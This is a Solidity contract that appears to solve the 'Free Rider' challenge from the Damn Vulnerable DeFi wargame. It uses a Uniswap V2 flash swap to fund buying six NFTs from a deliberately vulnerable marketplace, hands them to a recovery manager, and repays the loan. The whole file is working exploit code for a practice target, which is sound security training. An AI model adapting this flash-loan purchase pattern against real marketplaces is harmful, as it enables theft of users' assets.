// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {WETH} from "solmate/tokens/WETH.sol";
import {Test, console} from "forge-std/Test.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

// https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps

contract FreeRiderExploit is IUniswapV2Callee, ReentrancyGuard, IERC721Receiver {
    IUniswapV2Pair private immutable _uniswapPair;
    IUniswapV2Factory private immutable _uniswapV2Factory;

    WETH private immutable _weth;
    DamnValuableNFT private immutable _nft;
    DamnValuableToken private immutable _token;
    FreeRiderNFTMarketplace private immutable _marketplace;
    FreeRiderRecoveryManager private immutable _recoveryManager;

    constructor(
        address uniswapV2Factory,
        address uniswapPair,
        address payable weth,
        address token,
        address payable marketplace,
        address recoveryManager
    ) {
        _uniswapPair = IUniswapV2Pair(uniswapPair);
        _uniswapV2Factory = IUniswapV2Factory(uniswapV2Factory);

        _weth = WETH(weth);
        _token = DamnValuableToken(token);
        _marketplace = FreeRiderNFTMarketplace(marketplace);
        _recoveryManager = FreeRiderRecoveryManager(recoveryManager);

        _nft = _marketplace.token();
    }

    function run(uint256 amount) external {
        _uniswapPair.swap(amount, 0, address(this), abi.encode("trigger"));
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        assert(msg.sender == IUniswapV2Factory(_uniswapV2Factory).getPair(token0, token1));

        _weth.withdraw(_weth.balanceOf(address(this)));

        debug();

        uint256[] memory nfts = new uint256[](6);

        for (uint256 i = 0; i < 6; i++) {
            nfts[i] = i;
        }

        _marketplace.buyMany{value: 15 ether}(nfts);

        debug();

        for (uint256 i = 0; i < 6; i++) {
            _nft.safeTransferFrom(address(this), address(_recoveryManager), i, abi.encode(address(this)));
        }

        debug();

        uint256 fee = (amount0 * 3) / 997 + 1;
        uint256 amountToRepay = amount0 + fee;

        _weth.deposit{value: amountToRepay}();
        _weth.transfer(msg.sender, amountToRepay);

        // todo: send the eth to the player

        debug();
    }

    function debug() private view {
        console.log("eth balance", address(this).balance / 1e18);
        console.log("weth balance", _weth.balanceOf(address(this)) / 1e18);
        console.log("token balance", _token.balanceOf(address(this)) / 1e18);
        console.log("exploit addr", address(this));
        console.log("recovery manager addr", address(_recoveryManager));
        // for (uint256 i = 0; i < 6; i++) {
        //     console.log("owner of", i, _nft.ownerOf(i));
        // }
    }

    function onERC721Received(address, address, uint256, bytes memory)
        external
        override
        nonReentrant
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
